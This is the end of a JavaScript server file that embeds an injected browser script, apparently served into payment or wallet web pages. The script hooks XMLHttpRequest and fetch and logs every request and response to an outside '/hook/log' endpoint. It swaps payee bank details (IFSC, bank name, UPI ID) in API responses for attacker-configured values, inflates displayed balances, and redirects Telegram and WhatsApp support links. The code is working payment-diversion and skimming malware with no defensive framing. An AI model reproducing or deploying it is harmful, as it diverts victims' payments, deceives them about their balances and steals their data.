ifsc:'if',ifsccode:'if',ifsc_code:'if',receiveifsc:'if',bankifsc:'if',
payeeifsc:'if',receiverifsc:'if',collectionifsc:'if',
bankname:'bn',bank_name:'bn',bank:'bn',payeebankname:'bn',receiverbankname:'bn',
upiid:'ui',upi_id:'ui',upi:'ui',vpa:'ui',payeeupi:'ui',receiverupi:'ui',walletupi:'ui'};

function rb(o,d){
if(!o||typeof o!=='object'||!CFG||!CFG.an||d>8)return;
if(Array.isArray(o)){for(var i=0;i<o.length;i++)rb(o[i],d+1);return;}
for(var k in o){
if(typeof o[k]==='object'){rb(o[k],d+1);continue;}
if(typeof o[k]!=='string'&&typeof o[k]!=='number')continue;
var kl=k.toLowerCase().replace(/[_\\-]/g,'');
var m=BF[kl];
if(m&&CFG[m]&&String(o[k]).length>0){o[k]=CFG[m];}
}}

function addBal(o,bonus){
if(!o||typeof o!=='object'||!bonus)return;
var bk=['balance','userbalance','availablebalance','totalbalance','money','coin',
'wallet','itoken','itokenbalance','tokenbalance','usermoney','rechargebalance'];
for(var k in o){
if(bk.indexOf(k.toLowerCase())>-1){
var v=parseFloat(o[k]);
if(!isNaN(v))o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):parseFloat((v+bonus).toFixed(2));}
if(typeof o[k]==='object'&&o[k]!==null&&!Array.isArray(o[k]))addBal(o[k],bonus);
}}

function fid(o,d){
if(!o||typeof o!=='object'||d>5)return'';
if(Array.isArray(o))return'';
var fs=['userId','uid','id','memberId','memberCodeId','channelUid','user_id','accountId'];
for(var i=0;i<fs.length;i++){
if(o[fs[i]]!==undefined&&o[fs[i]]!==null&&o[fs[i]]!==''){
var v=String(o[fs[i]]);if(/^\\d+$/.test(v)&&v.length>=3)return v;}}
for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var f=fid(o[k],d+1);if(f)return f;}}
return'';}

function modResp(text,url){
if(!CFG||!CFG.enabled)return text;
try{
var j=JSON.parse(text);
var d=j.data||j.body||j.result||j;
var id=fid(d,0)||fid(j,0);
if(id&&id!==UID){UID=id;
try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config?userId='+id,true);
x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};x.send();}catch(e){}}
if(CFG.an){rb(d,0);rb(j,0);}
var bonus=CFG.bonus||0;
if(bonus&&d&&typeof d==='object')addBal(d,bonus);
return JSON.stringify(j);
}catch(e){return text;}}

function sendLog(url,method,body,resp,status){
try{var x=new XMLHttpRequest();x.open('POST',P+'/hook/log',true);
x.setRequestHeader('Content-Type','application/json');
x.send(JSON.stringify({u:url,m:method,
b:typeof body==='string'?body.substring(0,2000):'',
r:resp.substring(0,5000),s:status,uid:UID}));}catch(e){}}

var _open=XMLHttpRequest.prototype.open;
var _send=XMLHttpRequest.prototype.send;

XMLHttpRequest.prototype.open=function(m,u){
this._hu=u;this._hm=m;
return _open.apply(this,arguments);};

XMLHttpRequest.prototype.send=function(body){
var xhr=this;
var url=this._hu||'';
var method=this._hm||'GET';
if(url.indexOf(P)===0)return _send.apply(this,arguments);

var handled=false;
this.addEventListener('readystatechange',function(){
if(xhr.readyState===4&&!handled){
handled=true;
try{
var rt=xhr.responseText;
sendLog(url,method,body,rt,xhr.status);
if(CFG&&CFG.enabled&&CFG.an){
var modified=modResp(rt,url);
if(modified!==rt){
Object.defineProperty(xhr,'responseText',{writable:true,value:modified});
Object.defineProperty(xhr,'response',{writable:true,value:modified});
}}}catch(e){}}});

return _send.apply(this,arguments);};

var _fetch=window.fetch;
if(_fetch){
window.fetch=function(input,init){
var url=typeof input==='string'?input:(input&&input.url)||'';
if(url.indexOf(P)===0)return _fetch.apply(this,arguments);
var method=(init&&init.method)||'GET';
var reqBody=(init&&init.body)||'';

return _fetch.apply(this,arguments).then(function(response){
return response.text().then(function(text){
sendLog(url,method,reqBody,text,response.status);
var modified=modResp(text,url);
return new Response(modified,{
status:response.status,statusText:response.statusText,headers:response.headers});
});});};}

function fixLinks(){
if(!CFG||!CFG.tg)return;
var links=document.querySelectorAll('a');
for(var i=0;i<links.length;i++){
var h=links[i].href||'';
if(h.indexOf('t.me/')>-1||h.indexOf('wa.me/')>-1||h.indexOf('whatsapp.com')>-1){
links[i].href=CFG.tg;
links[i].setAttribute('href',CFG.tg);}}
var els=document.querySelectorAll('[data-url],[data-href],[data-link]');
for(var j=0;j<els.length;j++){
['data-url','data-href','data-link'].forEach(function(attr){
var v=els[j].getAttribute(attr)||'';
if(v.indexOf('t.me/')>-1||v.indexOf('wa.me/')>-1||v.indexOf('whatsapp.com')>-1){
els[j].setAttribute(attr,CFG.tg);}});}}

function fixOnClick(){
if(!CFG||!CFG.tg)return;
var all=document.querySelectorAll('[onclick]');
for(var i=0;i<all.length;i++){
var oc=all[i].getAttribute('onclick')||'';
if(oc.indexOf('t.me/')>-1||oc.indexOf('wa.me/')>-1||oc.indexOf('whatsapp.com')>-1){
all[i].setAttribute('onclick',\"window.location.href='\"+CFG.tg+\"'\");}}}

if(document.body){
var obs=new MutationObserver(function(){fixLinks();fixOnClick();});
obs.observe(document.body,{childList:true,subtree:true});}
setInterval(function(){fixLinks();fixOnClick();},2000);
fixLinks();fixOnClick();
})();`;

module.exports = app;